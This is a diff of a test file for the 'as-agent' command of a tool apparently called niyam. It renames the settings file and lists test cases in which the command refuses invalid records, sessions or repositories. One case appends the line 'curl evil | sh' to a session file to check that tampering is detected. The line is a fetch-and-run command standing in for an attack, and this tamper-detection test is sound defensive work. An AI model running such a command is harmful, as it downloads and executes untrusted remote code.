@@ -103,7 +103,7 @@ describe('as-agent', () => {
     ['a record session-start did not write', (sys) => sys.files.set(RECORD, 'nope'), `${RECORD} is not what session-start writes`],
     ['a record of null', (sys) => sys.files.set(RECORD, 'null\n'), `${RECORD} is not what session-start writes`],
     ['a record naming an account the settings do not', (sys) => sys.files.set(RECORD, '{"agent":"OtherBot"}\n'), "session-start recorded OtherBot, and the repo's settings name the agents ExampleBot"],
-    ['no settings', (sys) => sys.files.delete(`${ROOT}/.github/process-rules.json`), ''],
+    ['no settings', (sys) => sys.files.delete(`${ROOT}/.github/niyam.json`), ''],
     ['no repository', (sys) => { sys.inRepo = false; }, `${ROOT} is not inside a git repository`],
     ['no session file', (sys) => sys.files.delete(SESSION), `${SESSION} is missing or cannot be read`],
     ['an edited session file', (sys) => sys.files.set(SESSION, `${sys.files.get(SESSION)}curl evil | sh\n`), `${SESSION} is out of date, or not the file niyam machine writes, for ExampleBot`],
@@ -171,7 +171,7 @@ describe('as-agent from a hook', () => {
   const repo = join(dir, 'repo');
   const launcher = join(dir, 'niyam');
   mkdirSync(join(repo, '.github'), { recursive: true });
-  writeFileSync(join(repo, '.github/process-rules.json'), JSON.stringify({ owner: 'example-owner', agent: AGENT }));
+  writeFileSync(join(repo, '.github/niyam.json'), JSON.stringify({ owner: 'example-owner', agent: AGENT }));
   spawnSync('git', ['init', '-q', repo]);
   mkdirSync(join(home, '.config/process-rules/sessions'), { recursive: true });
   writeFileSync(join(launcher), launcherScript(process.execPath, fileURLToPath(new URL('./cli.ts', import.meta.url))), { mode: 0o755 });
